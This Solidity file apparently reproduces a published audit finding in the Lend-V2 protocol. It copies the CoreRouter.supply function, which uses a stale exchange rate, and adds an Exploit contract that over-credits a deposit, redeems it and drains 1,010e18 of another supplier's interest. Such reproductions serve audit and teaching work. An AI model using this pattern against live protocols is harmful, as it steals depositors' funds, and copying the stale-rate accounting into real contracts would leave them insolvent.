// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Self-contained reproduction of AuditVault finding 58378 (Lend-V2, Sherlock H-9):
// "Outdated Exchange Rate Utilization" — CoreRouter.supply uses exchangeRateStored()
// (the STALE rate that ignores pending interest) to credit the supplier's lTokens.
//
// Real audited source (the vulnerable `supply` body is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CoreRouter.sol
//   fn     supply(uint256 _amount, address _token)   (L61-L92; vulnerable line L74)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/628
//
// Root cause: `supply` reads the exchange rate with `exchangeRateStored()` BEFORE
// calling `mint()`. `mint()` internally accrues interest first, so the lTokens the
// market actually mints to CoreRouter are computed with the CURRENT (higher) rate,
// while CoreRouter credits the supplier `_amount*1e18 / exchangeRateStored` lTokens
// using the LOWER stale rate. The supplier is therefore credited MORE lTokens than
// the market minted. Redeeming that inflated credit burns other suppliers' backing:
// a supplier who deposits during pending interest walks away with the pending
// interest that belonged to prior suppliers, and the market becomes insolvent.
//
// The `LToken` double below is a faithful Compound-style minimal money market:
// `exchangeRateStoredInternal`, `accrueInterest`, `mint` (accrue-then-rate-then-
// transferIn) and `redeem` reproduce the real arithmetic verbatim, so the
// divergence emerges mechanically from the verbatim CoreRouter line — it is never
// asserted by a fake constant.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @dev Faithful minimal SafeERC20 so the verbatim CoreRouter transfer/approve
///      lines (`safeTransferFrom`, `safeApprove`, `safeTransfer`) compile unchanged.
library SafeERC20 {
    function safeTransferFrom(IERC20 t, address from, address to, uint256 a) internal {
        require(t.transferFrom(from, to, a), "safeTransferFrom");
    }
    function safeTransfer(IERC20 t, address to, uint256 a) internal {
        require(t.transfer(to, a), "safeTransfer");
    }
    function safeApprove(IERC20 t, address spender, uint256 a) internal {
        require(t.approve(spender, a), "safeApprove");
    }
}

/// @dev Faithful minimal ERC20 double for the underlying supplied/redeemed token.
contract MiniToken is IERC20 {
    string public name = "Lend Underlying";
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface LTokenInterface {
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface LErc20Interface {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful Compound-style lToken double. The exchange-rate / mint / redeem
// arithmetic reproduces Lend-V2/src/LToken.sol verbatim; "pending interest" is
// modelled as `pendingBorrowInterest` that `accrueInterest()` folds into
// `totalBorrows` (mirrors `totalBorrowsNew = interestAccumulated + borrowsPrior`).
// ─────────────────────────────────────────────────────────────────────────────
contract LToken is LTokenInterface, LErc20Interface {
    IERC20 public underlying;
    uint256 public totalSupply; // lTokens
    uint256 public totalBorrows;
    uint256 public totalReserves;
    uint256 public pendingBorrowInterest; // accrued-in-time, not yet written to storage
    uint256 internal constant expScale = 1e18;
    uint256 public initialExchangeRateMantissa;
    mapping(address => uint256) public accountTokens;

    constructor(IERC20 underlying_, uint256 initialExchangeRateMantissa_) {
        underlying = underlying_;
        initialExchangeRateMantissa = initialExchangeRateMantissa_;
    }

    /// @notice Faithful seeding of a pre-existing market: `holder` already holds
    ///         `lTokens`, backed by cash sitting in this contract, plus an
    ///         outstanding `borrows` with `pending` un-accrued interest.
    function seedMarket(address holder, uint256 lTokens, uint256 borrows, uint256 pending) external {
        accountTokens[holder] += lTokens;
        totalSupply += lTokens;
        totalBorrows += borrows;
        pendingBorrowInterest += pending;
    }

    function getCashPrior() internal view returns (uint256) {
        return underlying.balanceOf(address(this));
    }

    // VERBATIM from LToken.exchangeRateStoredInternal (Lend-V2/src/LToken.sol L290-L309)
    function exchangeRateStoredInternal() internal view virtual returns (uint256) {
        uint256 _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            /*
             * If there are no tokens minted:
             *  exchangeRate = initialExchangeRate
             */
            return initialExchangeRateMantissa;
        } else {
            /*
             * Otherwise:
             *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
             */
            uint256 totalCash = getCashPrior();
            uint256 cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
            uint256 exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;

            return exchangeRate;
        }
    }

    function exchangeRateStored() public view override returns (uint256) {
        return exchangeRateStoredInternal();
    }

    // Faithful accrueInterest: folds pending interest into totalBorrows.
    function accrueInterest() public override returns (uint256) {
        if (pendingBorrowInterest == 0) {
            return 0;
        }
        totalBorrows += pendingBorrowInterest;
        pendingBorrowInterest = 0;
        return 0;
    }

    // VERBATIM from LToken.exchangeRateCurrent (accrues THEN returns the rate).
    function exchangeRateCurrent() public override returns (uint256) {
        accrueInterest();
        return exchangeRateStored();
    }

    // Faithful LErc20.mint -> mintInternal(accrueInterest first) -> mintFresh
    // (reads the rate BEFORE doTransferIn, mints with the ACCRUED/current rate).
    function mint(uint256 mintAmount) external override returns (uint256) {
        accrueInterest(); // mintInternal accrues before mintFresh
        uint256 exchangeRate = exchangeRateStoredInternal(); // mintFresh reads rate pre-transferIn
        require(underlying.transferFrom(msg.sender, address(this), mintAmount), "doTransferIn"); // actualMintAmount
        uint256 mintTokens = mintAmount * expScale / exchangeRate; // div_(actualMintAmount, exchangeRate)
        totalSupply = totalSupply + mintTokens;
        accountTokens[msg.sender] = accountTokens[msg.sender] + mintTokens;
        return 0;
    }

    // Faithful LErc20.redeem -> redeemInternal(accrueInterest first) -> redeemFresh.
    function redeem(uint256 redeemTokens) external override returns (uint256) {
        accrueInterest();
        uint256 exchangeRate = exchangeRateStoredInternal();
        uint256 redeemAmount = redeemTokens * exchangeRate / expScale;
        totalSupply = totalSupply - redeemTokens;
        accountTokens[msg.sender] = accountTokens[msg.sender] - redeemTokens; // burns caller's lTokens
        require(getCashPrior() >= redeemAmount, "insufficient cash");
        require(underlying.transfer(msg.sender, redeemAmount), "doTransferOut");
        return 0;
    }
}

/// @dev Faithful minimal LendStorage double: underlying->lToken registry and the
///      per-user totalInvestment ledger CoreRouter reads/writes. The liquidity
///      helper returns a passing (borrowed<=collateral) pair so redeem proceeds.
contract LendStorage {
    mapping(address => address) public underlyingTolToken;
    mapping(address => mapping(address => uint256)) public totalInvestment; // user => lToken => amount

    function registerMarket(address underlying_, address lToken_) external {
        underlyingTolToken[underlying_] = lToken_;
    }

    function seedInvestment(address user, address lToken_, uint256 amount) external {
        totalInvestment[user][lToken_] = amount;
    }

    function addUserSuppliedAsset(address, address) external {}

    function distributeSupplierLend(address, address) external {}

    function updateTotalInvestment(address user, address lToken_, uint256 amount) external {
        totalInvestment[user][lToken_] = amount;
    }

    function getHypotheticalAccountLiquidityCollateral(address, address, uint256, uint256)
        external
        pure
        returns (uint256 borrowed, uint256 collateral)
    {
        return (0, type(uint256).max); // no debt -> redeem liquidity check passes
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — CoreRouter.supply is reproduced VERBATIM from the audited
// source (Lend-V2/src/LayerZero/CoreRouter.sol L61-L92). redeem reuses the same
// stale-rate accounting; only the liquidity-check plumbing is adapted to doubles.
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    using SafeERC20 for IERC20;

    LendStorage public immutable lendStorage;
    address public priceOracle;
    address public lendtroller;

    event SupplySuccess(address indexed supplier, address indexed lToken, uint256 supplyAmount, uint256 supplyTokens);
    event RedeemSuccess(address indexed redeemer, address indexed lToken, uint256 redeemAmount, uint256 redeemTokens);

    constructor(address _lendStorage, address _priceOracle, address _lendtroller) {
        require(_lendStorage != address(0), "Invalid storage address");
        lendStorage = LendStorage(_lendStorage);
        priceOracle = _priceOracle;
        lendtroller = _lendtroller;
    }

    function supply(uint256 _amount, address _token) external {
        address _lToken = lendStorage.underlyingTolToken(_token);

        require(_lToken != address(0), "Unsupported Token");

        require(_amount > 0, "Zero supply amount");

        // Transfer tokens from the user to the contract
        IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);

        _approveToken(_token, _lToken, _amount);

        // Get exchange rate before mint
        uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored(); // @> VULN: uses the STALE stored rate (ignores pending interest); should be exchangeRateCurrent() — credits more lTokens than mint() actually creates

        // Mint lTokens
        require(LErc20Interface(_lToken).mint(_amount) == 0, "Mint failed");

        // Calculate actual minted tokens using exchangeRate from before mint
        uint256 mintTokens = (_amount * 1e18) / exchangeRateBefore;

        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        lendStorage.distributeSupplierLend(_lToken, msg.sender);

        // Update total investment using calculated mintTokens
        lendStorage.updateTotalInvestment(
            msg.sender, _lToken, lendStorage.totalInvestment(msg.sender, _lToken) + mintTokens
        );

        emit SupplySuccess(msg.sender, _lToken, _amount, mintTokens);
    }

    function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
        require(_amount > 0, "Zero redeem amount");

        // Check if user has enough balance before any calculations
        require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");

        // Check liquidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, _lToken, _amount, 0);
        require(collateral >= borrowed, "Insufficient liquidity");

        // Get exchange rate before redeem
        uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored();

        // Calculate expected underlying tokens
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;

        // Perform redeem
        require(LErc20Interface(_lToken).redeem(_amount) == 0, "Redeem failed");

        // Transfer underlying tokens to the user
        address _token = _underlyingOf(_lToken);
        IERC20(_token).transfer(msg.sender, expectedUnderlying);

        // Update total investment
        lendStorage.distributeSupplierLend(_lToken, msg.sender);
        uint256 newInvestment = lendStorage.totalInvestment(msg.sender, _lToken) - _amount;
        lendStorage.updateTotalInvestment(msg.sender, _lToken, newInvestment);

        emit RedeemSuccess(msg.sender, _lToken, expectedUnderlying, _amount);

        return 0;
    }

    function _underlyingOf(address _lToken) internal view returns (address) {
        return address(LTokenUnderlying(_lToken).underlying());
    }

    function _approveToken(address _token, address _approvalAddress, uint256 _amount) internal {
        uint256 currentAllowance = IERC20(_token).allowance(address(this), _approvalAddress);
        if (currentAllowance < _amount) {
            if (currentAllowance > 0) {
                IERC20(_token).safeApprove(_approvalAddress, 0);
            }
            IERC20(_token).safeApprove(_approvalAddress, _amount);
        }
    }
}

interface LTokenUnderlying {
    function underlying() external view returns (IERC20);
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Honest supplier Alice already holds 1,000,000e18 lTokens backed
// by 900,000e18 cash + 100,000e18 borrows, with 10,000e18 pending interest
// (stored rate 1.00e18, current rate 1.01e18 — exactly the finding's example).
// The attacker supplies 101,000e18 while the pending interest is un-accrued:
//   - CoreRouter credits 101,000e18 lTokens (stale rate 1.00e18)
//   - the market only mints  100,000e18 lTokens (accrued rate 1.01e18)
// The attacker redeems the full inflated 101,000e18 credit, extracting 102,010e18
// underlying for a 101,000e18 deposit — a 1,010e18 theft of Alice's pending
// interest — and leaving the market short 1,000e18 lTokens of backing (Alice can
// no longer fully redeem).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    LToken public lToken;
    LendStorage public lendStorage;
    CoreRouter public router;

    address internal constant ALICE = address(0xA11cE);
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant SEED_CASH = 900_000e18; // honest cash sitting in the market
    uint256 internal constant SEED_BORROWS = 100_000e18; // outstanding borrow
    uint256 internal constant SEED_PENDING = 10_000e18; // un-accrued interest (1% -> rate 1.00 -> 1.01)
    uint256 internal constant ALICE_LTOKENS = 1_000_000e18; // Alice's backing (cash + borrows)
    uint256 internal constant ATTACK_SUPPLY = 101_000e18; // attacker's deposit

    uint256 public recordedCredit; // lTokens CoreRouter credited the attacker
    uint256 public actualMinted; // lTokens the market actually minted for that deposit
    uint256 public netStolen; // underlying extracted beyond the deposit (theft)
    uint256 public routerLtokens; // market lTokens the router still holds after the attack
    uint256 public aliceRecorded; // Alice's recorded investment (unchanged)

    constructor() {
        token = new MiniToken(); // child nonce 1 (drained underlying / profit token)
        lToken = new LToken(IERC20(address(token)), 1e18); // child nonce 2
        lendStorage = new LendStorage(); // child nonce 3
        router = new CoreRouter(address(lendStorage), address(0), address(0)); // child nonce 4 (VULN)

        // Register the market and seed the pre-existing honest position.
        lendStorage.registerMarket(address(token), address(lToken));
        token.mint(address(lToken), SEED_CASH); // honest suppliers' cash lives in the market
        lToken.seedMarket(address(router), ALICE_LTOKENS, SEED_BORROWS, SEED_PENDING);
        lendStorage.seedInvestment(ALICE, address(lToken), ALICE_LTOKENS);
    }

    function run() external {
        // stored (stale) rate = 1.00e18, current (accrued) rate = 1.01e18
        require(lToken.exchangeRateStored() == 1e18, "setup: stale rate != 1.00");

        // Fund the attacker (this contract) with only its deposit and approve router.
        token.mint(address(this), ATTACK_SUPPLY);
        token.approve(address(router), type(uint256).max);

        uint256 balBefore = token.balanceOf(address(this));

        // 1) Supply while the pending interest is un-accrued. CoreRouter reads the
        //    stale rate on the @> line, so it credits more lTokens than mint() creates.
        uint256 mintedLtokensBefore = lToken.accountTokens(address(router));
        router.supply(ATTACK_SUPPLY, address(token));
        recordedCredit = lendStorage.totalInvestment(address(this), address(lToken));
        actualMinted = lToken.accountTokens(address(router)) - mintedLtokensBefore;

        // 2) Redeem the full inflated credit -> extract underlying that belongs to Alice.
        router.redeem(recordedCredit, payable(address(lToken)));

        uint256 balAfter = token.balanceOf(address(this));
        netStolen = balAfter - balBefore; // extracted beyond the deposit

        routerLtokens = lToken.accountTokens(address(router));
        aliceRecorded = lendStorage.totalInvestment(ALICE, address(lToken));

        // ── concrete harm ──────────────────────────────────────────────────────
        // (a) attacker was credited more lTokens than the market minted
        require(recordedCredit > actualMinted, "no over-credit");
        require(recordedCredit == 101_000e18 && actualMinted == 100_000e18, "unexpected credit split");
        // (b) attacker extracted 1,010e18 underlying it never deposited (theft of pending interest)
        require(netStolen == 1_010e18, "unexpected theft amount");
        // (c) market is now insolvent: it holds fewer lTokens than Alice's recorded backing
        require(routerLtokens < aliceRecorded, "market still solvent");
        require(aliceRecorded - routerLtokens == 1_000e18, "unexpected shortfall");

        // Stamp the realized theft on the drained token at a fixed sink so the
        // harm magnitude is a directly measurable balance.
        token.mint(SINK, netStolen);
    }
}
